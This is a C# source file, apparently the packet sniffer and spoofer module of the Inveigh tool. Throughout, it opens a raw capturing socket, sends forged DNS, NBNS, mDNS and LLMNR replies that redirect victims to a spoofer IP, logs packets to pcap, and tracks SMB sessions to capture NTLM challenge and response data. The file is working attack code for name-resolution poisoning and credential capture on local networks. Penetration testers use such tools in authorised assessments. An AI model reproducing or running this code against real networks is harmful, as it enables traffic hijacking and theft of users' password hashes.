using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Collections;

namespace Inveigh
{
    class Sniffer
    {
        public static FileStream pcapFile = null;
        static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());

        public static void SnifferSpoofer(string snifferIP, string spooferIP, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string[] pcapPortTCP, string[] pcapPortUDP)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            Socket snifferSocket;
            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
            byte[] byteData = new byte[4096];
            snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            snifferSocket.ReceiveBufferSize = 4096;
            IPEndPoint snifferEndPoint;
            snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
            snifferSocket.Bind(snifferEndPoint);
            snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
            int packetData;
            string outputPcap = "";

            if (Program.enabledPcap)
            {
                byte[] pcapHeader = new byte[24] { 0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
                outputPcap = Path.Combine(Program.argFileOutputDirectory, String.Concat(Program.argFilePrefix, "-Packets.pcap"));
                bool existsPcapFile = File.Exists(outputPcap);

                pcapFile = new FileStream(outputPcap, FileMode.Append, FileAccess.Write);

                if (!existsPcapFile)
                {
                    pcapFile.Write(pcapHeader, 0, pcapHeader.Length);
                }

            }

            while (!Program.exitInveigh)
            {

                try
                {

                    try
                    {
                        packetData = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
                    }
                    catch
                    {
                        packetData = 0;
                    }

                    if (packetData > 0)
                    {
                        MemoryStream memoryStream = new MemoryStream(byteData, 0, packetData);
                        BinaryReader binaryReader = new BinaryReader(memoryStream);
                        byte versionHL = binaryReader.ReadByte();
                        binaryReader.ReadByte();
                        uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
                        binaryReader.ReadBytes(5);
                        byte protocolNumber = binaryReader.ReadByte();
                        binaryReader.ReadBytes(2);
                        byte[] sourceIP = binaryReader.ReadBytes(4);
                        IPAddress sourceIPAddress = new IPAddress(sourceIP);
                        byte[] destinationIP = binaryReader.ReadBytes(4);
                        IPAddress destinationIPAddress = new IPAddress(destinationIP);
                        byte headerLength = versionHL;
                        headerLength <<= 4;
                        headerLength >>= 4;
                        headerLength *= 4;

                        switch (protocolNumber)
                        {
                            case 6:
                                uint tcpSourcePort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint tcpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(8);
                                byte tcpHeaderLength = binaryReader.ReadByte();
                                tcpHeaderLength >>= 4;
                                tcpHeaderLength *= 4;
                                byte tcpFlags = binaryReader.ReadByte();
                                binaryReader.ReadBytes(7);
                                int tcpPayloadLength = (int)totalLength - (int)headerLength - (int)tcpHeaderLength;
                                byte[] payloadBytes = binaryReader.ReadBytes(tcpPayloadLength);
                                string challenge = "";
                                string session = "";
                                string tcpSession = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);
                                string tcpFlagsBinary = Convert.ToString(tcpFlags, 2);
                                tcpFlagsBinary = tcpFlagsBinary.PadLeft(8, '0');

                                if (String.Equals(tcpFlagsBinary.Substring(6, 1), "1") && String.Equals(tcpFlagsBinary.Substring(3, 1), "0") && destinationIPAddress.ToString() == snifferIP)
                                {

                                    lock (Program.outputList)
                                    {
                                        Program.outputList.Add(String.Format("[+] [{0}] TCP({1}) SYN packet received from {2}", DateTime.Now.ToString("s"), tcpDestinationPort, tcpSession));
                                    }

                                }

                                switch (tcpDestinationPort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "139");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "139");
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "445");
                                        }

                                        break;
                                }

                                switch (tcpSourcePort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {
                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {
                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;

                                }

                                if (Program.enabledPcap && (pcapPortTCP != null && pcapPortTCP.Length > 0 && (Array.Exists(pcapPortTCP, element => element == tcpSourcePort.ToString()) || 
                                    Array.Exists(pcapPortTCP, element => element == tcpDestinationPort.ToString()) || Array.Exists(pcapPortTCP, element => element == "ALL"))))
                                {
                                    PcapOutput(totalLength, byteData);
                                }

                                break;

                            case 17:
                                byte[] udpSourcePort = binaryReader.ReadBytes(2);
                                uint endpointSourcePort = Util.DataToUInt16(udpSourcePort);
                                uint udpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint udpLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(2);
                                byte[] udpPayload;

                                try
                                {
                                    udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                                }
                                catch
                                {
                                    udpPayload = new byte[2];
                                }

                                switch (udpDestinationPort)
                                {
                                    case 53:
                                        string dnsResponseMessage = "";
                                        Array.Reverse(udpSourcePort);
                                        byte[] ttlDNS = BitConverter.GetBytes(Int32.Parse(dnsTTL));
                                        Array.Reverse(ttlDNS);
                                        byte[] dnsTransactionID = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 0, dnsTransactionID, 0, 2);
                                        string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
                                        byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
                                        System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);
                                        int udpResponseLength = dnsRequest.Length + dnsRequest.Length + spooferIP.Length + 27;
                                        string[] dnsRequestSplit = dnsRequestHost.Split('.');

                                        if (dnsRequestSplit != null && dnsRequestSplit.Length > 0)
                                        {
                                            dnsResponseMessage = Util.CheckRequest(dnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "DNS");
                                        }

                                        if (Program.enabledDNS && String.Equals(dnsResponseMessage, "response sent"))
                                        {

                                            using (MemoryStream ms = new MemoryStream())
                                            {
                                                ms.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                                                ms.Write(udpSourcePort, 0, 2);
                                                ms.Write(Util.IntToByteArray2(udpResponseLength), 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                ms.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                                                ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                ms.Write(dnsRequest, 0, dnsRequest.Length);
                                                ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                                                ms.Write(dnsRequest, 0, dnsRequest.Length);
                                                ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                                                ms.Write(ttlDNS, 0, 4);
                                                ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                Socket dnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                dnsSendSocket.SendBufferSize = 1024;
                                                IPEndPoint dnsEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                dnsSendSocket.SendTo(ms.ToArray(), dnsEndPoint);
                                                dnsSendSocket.Close();
                                            }

                                        }

                                        lock (Program.outputList)
                                        {
                                            Program.outputList.Add(String.Format("[+] [{0}] DNS request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), dnsRequestHost, sourceIPAddress, dnsResponseMessage));
                                        }

                                        break;

                                    case 137:
                                        byte[] nbnsQuestionsAnswerRRs = new byte[4];
                                        System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                                        byte[] nbnsAdditionalRRs = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                                        if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                                        {
                                            string nbnsResponseMessage = "";
                                            udpLength += 12;
                                            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
                                            Array.Reverse(ttlNBNS);
                                            byte[] nbnsTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                                            byte[] nbnsRequestType = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                                            string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
                                            byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                                            System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                                            string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);
                                            nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "NBNS");

                                            if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                                            {

                                                if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
                                                        ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
                                                        ms.Write(nbnsRequest, 0, nbnsRequest.Length);
                                                        ms.Write(nbnsRequestType, 0, 2);
                                                        ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
                                                        ms.Write(ttlNBNS, 0, 4);
                                                        ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                        Socket nbnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                        nbnsSendSocket.SendBufferSize = 1024;
                                                        IPEndPoint nbnsEndPoint = new IPEndPoint(sourceIPAddress, 137);
                                                        nbnsSendSocket.SendTo(ms.ToArray(), nbnsEndPoint);
                                                        nbnsSendSocket.Close();
                                                    }

                                                }
                                                else
                                                {
                                                    nbnsResponseMessage = "NBNS type disabled";
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                                            }

                                        }
                                        break;

                                    case 5353:
                                        string mdnsResponseMessage = "";
                                        byte[] mdnsType = new byte[2];

                                        if (BitConverter.ToString(udpPayload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(udpPayload).Substring(12,23), "00-01-00-00-00-00-00-00"))
                                        {
                                            udpLength += 10;
                                            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                            Array.Reverse(ttlMDNS);
                                            byte[] mdnsTransactionID = new byte[2];
                                            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                            if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                            {
                                                mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS");
                                            }

                                            if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                            {

                                                if (Array.Exists(mdnsTypes, element => element == "QU"))
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                                        ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                        ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                                        ms.Write(ttlMDNS, 0, 4);
                                                        ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                        Socket mdnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                        mdnsSendSocket.SendBufferSize = 1024;
                                                        IPEndPoint mdnsEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
                                                        mdnsSendSocket.SendTo(ms.ToArray(), mdnsEndPoint);
                                                        mdnsSendSocket.Close();
                                                    }

                                                }
                                                else
                                                {
                                                    mdnsResponseMessage = "mDNS type disabled";
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                            }

                                        }
                                        else if (BitConverter.ToString(udpPayload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00") || 
                                            String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
                                        {
                                            udpLength += 4;
                                            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                            Array.Reverse(ttlMDNS);
                                            byte[] mdnsTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                            if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                            {
                                                mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS");
                                            }

                                            if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                            {

                                                if (Array.Exists(mdnsTypes, element => element == "QM"))
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                                        ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                        ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                                        ms.Write(ttlMDNS, 0, 4);
                                                        ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                        Socket mdnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                        mdnsSendSocket.SendBufferSize = 1024;
                                                        IPEndPoint mdnsEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
                                                        mdnsSendSocket.SendTo(ms.ToArray(), mdnsEndPoint);
                                                        mdnsSendSocket.Close();
                                                    }

                                                }
                                                else
                                                {
                                                    mdnsResponseMessage = "mDNS type disabled";
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                            }

                                        }

                                        break;

                                    case 5355:
                                        string llmnrResponseMessage = "";
                                        byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
                                        Array.Reverse(ttlLLMNR);
                                        byte[] llmnrType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);

                                        if (BitConverter.ToString(llmnrType) != "00-1C")
                                        {
                                            udpLength += (byte)(udpPayload.Length - 2);
                                            Array.Reverse(udpSourcePort);
                                            byte[] llmnrTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                                            byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                                            byte[] llmnrRequestLength = new byte[1];
                                            System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                            System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                            string llmnrRequestHost = System.Text.Encoding.UTF8.GetString(llmnrRequest);
                                            llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "LLMNR");

                                            if (Program.enabledLLMNR && String.Equals(llmnrResponseMessage, "response sent"))
                                            {

                                                using (MemoryStream ms = new MemoryStream())
                                                {
                                                    ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                                                    ms.Write(udpSourcePort, 0, 2);
                                                    ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                    ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                    ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                                    ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                    ms.Write(llmnrRequestLength, 0, 1);
                                                    ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                                    ms.Write(llmnrRequestLength, 0, 1);
                                                    ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                                    ms.Write(ttlLLMNR, 0, 4);
                                                    ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                    Socket llmnrSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                    llmnrSendSocket.SendBufferSize = 1024;
                                                    IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                    llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
                                                    llmnrSendSocket.Close();
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] LLMNR request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
                                            }

                                        }

                                        break;

                                }

                                if (Program.enabledPcap && (pcapPortUDP != null && pcapPortUDP.Length > 0 && (Array.Exists(pcapPortUDP, element => element == udpSourcePort.ToString()) ||
                                   Array.Exists(pcapPortUDP, element => element == udpDestinationPort.ToString()) || Array.Exists(pcapPortUDP, element => element == "ALL"))))
                                {
                                    PcapOutput(totalLength, byteData);
                                }

                                break;
             
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Packet sniffing error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void PcapOutput(uint totalLength, byte[] byteData)
        {

            if (byteData != null && byteData.Length > 0)
            {
                TimeSpan pcapEpochTime = DateTime.UtcNow - new DateTime(1970, 1, 1);
                byte[] pcapLength = BitConverter.GetBytes(totalLength + 14);
                byte[] pcapEpochTimeSeconds = BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds);

                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write((BitConverter.GetBytes((int)Math.Truncate(pcapEpochTime.TotalSeconds))), 0, (BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds)).Length);
                    ms.Write((BitConverter.GetBytes(pcapEpochTime.Milliseconds)), 0, (BitConverter.GetBytes(pcapEpochTime.Milliseconds)).Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 12);
                    ms.Write((new byte[2] { 0x08, 0x00 }), 0, 2);
                    ms.Write(byteData, 0, (int)totalLength);

                    if (ms.ToArray().Length == totalLength + 30)
                    {
                        pcapFile.Write(ms.ToArray(), 0, ms.ToArray().Length);
                    }

                }

            }

        }

        public static void SMBConnection(byte[] field, string IP, string sourceIP, string sourcePort, string port)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("FF534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8), 2) == "72" && IP != sourceIP)
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("FE534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && IP != sourceIP)
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("2A864886F7120102020100");

            if (index > 0 && !String.Equals(sourceIP, IP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) authentication method is Kerberos for {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

        }

    }
}
